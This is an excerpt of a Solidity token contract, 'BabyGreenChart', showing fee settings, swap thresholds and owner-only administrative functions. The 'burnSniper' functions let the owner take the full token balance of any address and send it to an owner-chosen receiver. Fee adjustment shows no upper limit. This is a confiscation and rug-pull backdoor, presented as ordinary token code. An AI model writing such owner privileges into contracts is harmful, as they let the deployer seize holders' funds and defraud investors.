...
contract BabyGreenChart is IERC20, Ownable {
    ...
    uint256 public _tsxnCap = (_totalSupply * 10) / 1000;       // 1% 
    ...
    uint256 smallSwapThreshold = _totalSupply.mul(113749274).div(100000000000); // ~0.1%
    uint256 largeSwapThreshold = _totalSupply.mul(317671302).div(100000000000); // ~0.3%
    ...
    function setSwapBackSettings(bool _enabled, uint256 _amount, address _autoLiquidityReceiver, address _marketingFeeReceiver, address _giveawayReceiver) external onlyOwner {
    ...
    function triggerManualBuyback(uint256 amountBNB) external onlyOwner {
        buyTokens(amountBNB, giveawayReceiver);
    }
    ...
    function adjustFees(uint256 _marketingFee, uint256 _giveawayFee, uint256 _liquidityFee, uint256 _feeDenominator) external onlyOwner {
    ...
    function resetFees() external onlyOwner {
        ...
        marketingFee = 80;
        charityFee = 0;
        totalFee = liquidityFee.add(giveawayFee).add(charityFee).add(marketingFee);
        feeDenominator = 1000;
    }
    ...
    function burnSniper(address sniperAddress) external onlyOwner {
        _transferFrom(sniperAddress, autoLiquidityReceiver, balanceOf(sniperAddress));
    }

    function burnSnipersMemory(address[] memory sniperAddresses) external onlyOwner {
        for (uint i = 0; i < sniperAddresses.length; i++) {
            _transferFrom(sniperAddresses[i], autoLiquidityReceiver, balanceOf(sniperAddresses[i]));
        }
    }

    function burnSnipersCalldata(address[] calldata sniperAddresses) external onlyOwner {
        for (uint i = 0; i < sniperAddresses.length; i++) {
            _transferFrom(sniperAddresses[i], autoLiquidityReceiver, balanceOf(sniperAddresses[i]));
        }
    }
